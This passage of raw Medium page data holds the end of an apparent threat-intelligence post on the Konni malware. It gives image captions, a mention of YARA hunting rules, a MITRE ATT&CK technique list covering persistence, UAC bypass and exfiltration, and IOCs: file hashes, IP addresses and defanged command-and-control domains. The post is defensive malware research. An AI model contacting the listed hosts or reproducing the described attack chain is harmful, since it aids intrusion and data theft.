campaigns:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*jX9hnL1X4_27wCGWdLU84g.png":{"__typename":"ImageMetadata","id":"1*jX9hnL1X4_27wCGWdLU84g.png","originalHeight":717,"originalWidth":505,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_109":{"__typename":"Paragraph","id":"4a39df3717a7_109","name":"ce34","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*jX9hnL1X4_27wCGWdLU84g.png"},"text":"Typical Konni Data Reconnaissance and Exfiltration","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_110":{"__typename":"Paragraph","id":"4a39df3717a7_110","name":"b88c","type":"P","href":null,"layout":null,"metadata":null,"text":"Also, the decoding routine is identical across all Konni samples we have analyzed which indicate a code reuse by the threat actor.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*-BjFw4f2oxgNspaF-4f6oQ.png":{"__typename":"ImageMetadata","id":"1*-BjFw4f2oxgNspaF-4f6oQ.png","originalHeight":812,"originalWidth":821,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_111":{"__typename":"Paragraph","id":"4a39df3717a7_111","name":"b3c3","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*-BjFw4f2oxgNspaF-4f6oQ.png"},"text":"Konni Decoding Routine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_112":{"__typename":"Paragraph","id":"4a39df3717a7_112","name":"0226","type":"H3","href":null,"layout":null,"metadata":null,"text":"Hunting for Konni","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_113":{"__typename":"Paragraph","id":"4a39df3717a7_113","name":"4594","type":"P","href":null,"layout":null,"metadata":null,"text":"The YARA rules below were used to find additional samples of the Konni malware known in the wild. It is a combination of unique strings of the macro within the lure documents, unique strings and win API calls from the payload and unique opcode sequence taken from the decoding routine shared among all samples.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*lLiBXlspvBdNvuf5MtmTnQ.png":{"__typename":"ImageMetadata","id":"1*lLiBXlspvBdNvuf5MtmTnQ.png","originalHeight":573,"originalWidth":711,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_114":{"__typename":"Paragraph","id":"4a39df3717a7_114","name":"e1d0","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*lLiBXlspvBdNvuf5MtmTnQ.png"},"text":"YARA Rule: Lure Doc","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*193tHpBTByMhkFVptP56jg.png":{"__typename":"ImageMetadata","id":"1*193tHpBTByMhkFVptP56jg.png","originalHeight":952,"originalWidth":677,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4a39df3717a7_115":{"__typename":"Paragraph","id":"4a39df3717a7_115","name":"b046","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*193tHpBTByMhkFVptP56jg.png"},"text":"YARA Rule: Konni Payload","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_116":{"__typename":"Paragraph","id":"4a39df3717a7_116","name":"fea9","type":"P","href":null,"layout":null,"metadata":null,"text":"Check my YARA github page to test out the YARA rules I used to hunt for Konni samples.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":9,"end":25,"href":"https:\u002F\u002Fgithub.com\u002Fd-hunter1\u002FYARA","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_117":{"__typename":"Paragraph","id":"4a39df3717a7_117","name":"a9fe","type":"H3","href":null,"layout":null,"metadata":null,"text":"MITRE ATT&CK Techniques","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_118":{"__typename":"Paragraph","id":"4a39df3717a7_118","name":"3d28","type":"P","href":null,"layout":null,"metadata":null,"text":"Execution","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":9,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_119":{"__typename":"Paragraph","id":"4a39df3717a7_119","name":"a8db","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1059-Command-Line Interface","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":28,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_120":{"__typename":"Paragraph","id":"4a39df3717a7_120","name":"55d2","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1129-Execution through Module Load","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":35,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1129","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_121":{"__typename":"Paragraph","id":"4a39df3717a7_121","name":"2d29","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1085-Rundll32","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":14,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1085","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_122":{"__typename":"Paragraph","id":"4a39df3717a7_122","name":"b555","type":"P","href":null,"layout":null,"metadata":null,"text":"Persistence","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":11,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_123":{"__typename":"Paragraph","id":"4a39df3717a7_123","name":"85ad","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1031-Modify Existing Service","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":29,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1031\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_124":{"__typename":"Paragraph","id":"4a39df3717a7_124","name":"4e20","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1050-New Service","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":17,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1050\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_125":{"__typename":"Paragraph","id":"4a39df3717a7_125","name":"a481","type":"P","href":null,"layout":null,"metadata":null,"text":"Privilege Escalation","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":20,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_126":{"__typename":"Paragraph","id":"4a39df3717a7_126","name":"2960","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1134-Access Token Manipulation","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":31,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_127":{"__typename":"Paragraph","id":"4a39df3717a7_127","name":"16bd","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1050-New Service","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":17,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1050\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_128":{"__typename":"Paragraph","id":"4a39df3717a7_128","name":"ac06","type":"P","href":null,"layout":null,"metadata":null,"text":"Defense Evasion","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_129":{"__typename":"Paragraph","id":"4a39df3717a7_129","name":"bfa4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1134-Access Token Manipulation","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":31,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_130":{"__typename":"Paragraph","id":"4a39df3717a7_130","name":"c007","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1088-Bypass User Account Control","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":33,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1088","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_131":{"__typename":"Paragraph","id":"4a39df3717a7_131","name":"2a4c","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1140-Deobfuscate\u002FDecode Files or Information","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":45,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1140","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_132":{"__typename":"Paragraph","id":"4a39df3717a7_132","name":"cc45","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1112-Modify Registry","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":21,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1112","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_133":{"__typename":"Paragraph","id":"4a39df3717a7_133","name":"4deb","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1085-Rundll32","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":14,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1085","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_134":{"__typename":"Paragraph","id":"4a39df3717a7_134","name":"f028","type":"P","href":null,"layout":null,"metadata":null,"text":"Discovery","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":9,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_135":{"__typename":"Paragraph","id":"4a39df3717a7_135","name":"ff1a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1057-Process Discovery","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":23,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1057","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_136":{"__typename":"Paragraph","id":"4a39df3717a7_136","name":"5a0b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1082-System Information Discovery","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":34,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1082","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_137":{"__typename":"Paragraph","id":"4a39df3717a7_137","name":"ffa3","type":"P","href":null,"layout":null,"metadata":null,"text":"Exfiltration","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":12,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_138":{"__typename":"Paragraph","id":"4a39df3717a7_138","name":"d729","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1048-Exfiltration Over Alternative Protocol","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":44,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1048","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_139":{"__typename":"Paragraph","id":"4a39df3717a7_139","name":"445b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"T1132-Data Encoding","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":6,"end":19,"href":"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1132","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_140":{"__typename":"Paragraph","id":"4a39df3717a7_140","name":"f76e","type":"H3","href":null,"layout":null,"metadata":null,"text":"IOCs","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_141":{"__typename":"Paragraph","id":"4a39df3717a7_141","name":"5c64","type":"P","href":null,"layout":null,"metadata":null,"text":"Lure Documents","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":14,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_142":{"__typename":"Paragraph","id":"4a39df3717a7_142","name":"34b9","type":"ULI","href":null,"layout":null,"metadata":null,"text":"8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_143":{"__typename":"Paragraph","id":"4a39df3717a7_143","name":"5628","type":"ULI","href":null,"layout":null,"metadata":null,"text":"4c201f9949804e90f94fe91882cb8aad3e7daf496a7f4e792b9c7fed95ab0726","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_144":{"__typename":"Paragraph","id":"4a39df3717a7_144","name":"d66a","type":"ULI","href":null,"layout":null,"metadata":null,"text":"ed63e84985e1af9c4764e6b6ca513ec1c16840fb2534b86f95e31801468be67a","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_145":{"__typename":"Paragraph","id":"4a39df3717a7_145","name":"a556","type":"P","href":null,"layout":null,"metadata":null,"text":"Konni Loader","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":12,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_146":{"__typename":"Paragraph","id":"4a39df3717a7_146","name":"f6aa","type":"ULI","href":null,"layout":null,"metadata":null,"text":"6a22db7df237c085855deb48686217173dc2664f4b927ebe238d4442b68a2fd3","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_147":{"__typename":"Paragraph","id":"4a39df3717a7_147","name":"25da","type":"ULI","href":null,"layout":null,"metadata":null,"text":"2ab1b28bae24217e8b6dd0cd30bb7258fa34c0d7337ecfea55e4310d08aeb1e6","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_148":{"__typename":"Paragraph","id":"4a39df3717a7_148","name":"8aeb","type":"P","href":null,"layout":null,"metadata":null,"text":"Konni final payload","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":19,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_149":{"__typename":"Paragraph","id":"4a39df3717a7_149","name":"5ca3","type":"ULI","href":null,"layout":null,"metadata":null,"text":"e94fa697d8661d79260edf17c0a519fae4b2a64037aa79b29d6631205995fdad","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_150":{"__typename":"Paragraph","id":"4a39df3717a7_150","name":"6ddc","type":"ULI","href":null,"layout":null,"metadata":null,"text":"6256ba2b89c78877328cc70d45db980310a51545a83d1d922d64048b57d6c057","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_151":{"__typename":"Paragraph","id":"4a39df3717a7_151","name":"205e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"52ba17b90244a46e0ef2a653452b26bcb94f0a03b999c343301fef4e3c1ec5d2","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_152":{"__typename":"Paragraph","id":"4a39df3717a7_152","name":"4aa5","type":"ULI","href":null,"layout":null,"metadata":null,"text":"7d2b1af486610a45f78a573af9a9ad00414680ff8e958cfb5437a1b140acb60c","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_153":{"__typename":"Paragraph","id":"4a39df3717a7_153","name":"11ff","type":"ULI","href":null,"layout":null,"metadata":null,"text":"ceb8093507911939a17c6c7b39475f5d4db70a9ed3b85ef34ff5e6372b20a73e","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_154":{"__typename":"Paragraph","id":"4a39df3717a7_154","name":"37a2","type":"ULI","href":null,"layout":null,"metadata":null,"text":"8795b2756efa32d5101a8d38ea27fca9c8c7ed1d54da98f0520f72706d1c5105","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_155":{"__typename":"Paragraph","id":"4a39df3717a7_155","name":"75f9","type":"ULI","href":null,"layout":null,"metadata":null,"text":"7f6984fa9d0bbc1bd6ab531f0a8c2f4beb15de30f2b20054d3980395d77665af","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_156":{"__typename":"Paragraph","id":"4a39df3717a7_156","name":"fcd2","type":"ULI","href":null,"layout":null,"metadata":null,"text":"290c942da70c68d28a387775fbb7e6cab6749547d278cb755b4999e0fe61a09f","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_157":{"__typename":"Paragraph","id":"4a39df3717a7_157","name":"a7d4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"274e706809a1c0363f78363d0c6a7d256be5be11039de14f617265e01d550a98","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_158":{"__typename":"Paragraph","id":"4a39df3717a7_158","name":"5672","type":"P","href":null,"layout":null,"metadata":null,"text":"IP Addresses","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":12,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_159":{"__typename":"Paragraph","id":"4a39df3717a7_159","name":"27bd","type":"ULI","href":null,"layout":null,"metadata":null,"text":"69.197.143.12","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":13,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_160":{"__typename":"Paragraph","id":"4a39df3717a7_160","name":"e695","type":"ULI","href":null,"layout":null,"metadata":null,"text":"185.27.134.11","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":13,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_161":{"__typename":"Paragraph","id":"4a39df3717a7_161","name":"322c","type":"ULI","href":null,"layout":null,"metadata":null,"text":"88.99.13.69","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":11,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_162":{"__typename":"Paragraph","id":"4a39df3717a7_162","name":"00c4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"162.253.155.226","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_163":{"__typename":"Paragraph","id":"4a39df3717a7_163","name":"e4ea","type":"P","href":null,"layout":null,"metadata":null,"text":"Domains","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":7,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_164":{"__typename":"Paragraph","id":"4a39df3717a7_164","name":"9e57","type":"ULI","href":null,"layout":null,"metadata":null,"text":"clean.1apps[.]com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":17,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_165":{"__typename":"Paragraph","id":"4a39df3717a7_165","name":"1cf1","type":"ULI","href":null,"layout":null,"metadata":null,"text":"handicap. eu5[.]org","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":19,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_166":{"__typename":"Paragraph","id":"4a39df3717a7_166","name":"febb","type":"ULI","href":null,"layout":null,"metadata":null,"text":"panda2019.eu5[.]org","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":19,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4a39df3717a7_167":{"__typename":"Paragraph","id":"4a39df3717a7_167","name":"d403","type":"ULI","href":null,"layout":null,"metadata":null,"text":"ftpupload[.]net","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":0,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"CollectionViewerEdge:collectionId:403a7b3e8c94-viewerId:lo_3fc4c66d8421":{"__typename":"CollectionViewerEdge","id":"collectionId:403a7b3e8c94-viewerId:lo_3fc4c66d8421","isEditor":false,"isMuting":false},"ImageMetadata:1*TdnwvJX4h5-6-4x8HU600w.png":{"__typename":"ImageMetadata","id":"1*TdnwvJX4h5-6-4x8HU600w.png","originalWidth":541,"originalHeight":150},"PostViewerEdge:postId:b45a0f321e9b-viewerId:lo_3fc4c66d8421":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:b45a0f321e9b-viewerId:lo_3fc4c66d8421"},"Tag:malware":{"__typename":"Tag","id":"malware","displayTitle":"Malware","normalizedTagSlug":"malware"},"Tag:malware-analysis":{"__typename":"Tag","id":"malware-analysis","displayTitle":"Malware Analysis","normalizedTagSlug":"malware-analysis"},"Tag:threat-hunting":{"__typename":"Tag","id":"threat-hunting","displayTitle":"Threat Hunting","normalizedTagSlug":"threat-hunting"},"Tag:threat-intelligence":{"__typename":"Tag","id":"threat-intelligence","displayTitle":"Threat Intelligence","normalizedTagSlug":"threat-intelligence"},"Tag:cybersecurity":{"__typename":"Tag","id":"cybersecurity","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Post:b45a0f321e9b":{"__typename":"Post","id":"b45a0f321e9b","collection":{"__ref":"Collection:403a7b3e8c94"},"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"e06d","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"3e57","startIndex":12,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"80ce","startIndex":31,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"6b8c","startIndex":63,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"6141","startIndex":73,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"ceb3","startIndex":92,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:4a39df3717a7_0"},{"__ref":"Paragraph:4a39df3717a7_1"},{"__ref":"Paragraph:4a39df3717a7_2"},{"__ref":"Paragraph:4a39df3717a7_3"},{"__ref":"Paragraph:4a39df3717a7_4"},{"__ref":"Paragraph:4a39df3717a7_5"},{"__ref":"Paragraph:4a39df3717a7_6"},{"__ref":"Paragraph:4a39df3717a7_7"},{"__ref":"Paragraph:4a39df3717a7_8"},{"__ref":"Paragraph:4a39df3717a7_9"},{"__ref":"Paragraph:4a39df3717a7_10"},{"__ref":"Paragraph:4a39df3717a7_11"},{"__ref":"Paragraph:4a39df3717a7_12"},{"__ref":"Paragraph:4a39df3717a7_13"},{"__ref":"Paragraph:4a39df3